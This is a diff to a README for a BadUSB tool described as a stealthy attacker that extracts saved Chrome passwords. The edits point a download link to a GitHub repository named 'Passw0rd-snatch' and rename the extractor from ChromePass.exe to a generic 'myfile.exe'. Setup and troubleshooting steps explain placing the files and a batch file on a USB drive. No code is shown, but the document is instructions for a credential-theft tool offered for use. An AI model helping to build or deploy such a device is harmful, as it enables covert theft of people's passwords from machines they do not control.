@@ -28,7 +28,7 @@ This BadUSB script turns a USB device into a stealthy attacker that **extracts s
 ## 🚀 Setup
 
 1. **Get BrowserPass**:
-   - Download `MyFile` from my Github: [Lostboy069-PasswordTheif]([https://www.nirsoft.net/utils/chromepass.html](https://github.com/Lostboy069/Passw0rd-snatch)).
+   - Download `MyFile` from my Github: [Lostboy069-PasswordTheif](https://github.com/Lostboy069/Passw0rd-snatch)).
    - Place `All files` in the USB’s root directory.
 
 2. **Create the Batch File**:
@@ -68,7 +68,7 @@ This BadUSB script turns a USB device into a stealthy attacker that **extracts s
 
 ## 🐛 Troubleshooting
 
-- **“ChromePass.exe not found”**:
+- **“myfile.exe not found”**:
   - Ensure `myfile.exe` is in the USB root alongside the `.bat` file.
 - **No passwords extracted**:
   - Verify Chrome has saved passwords.
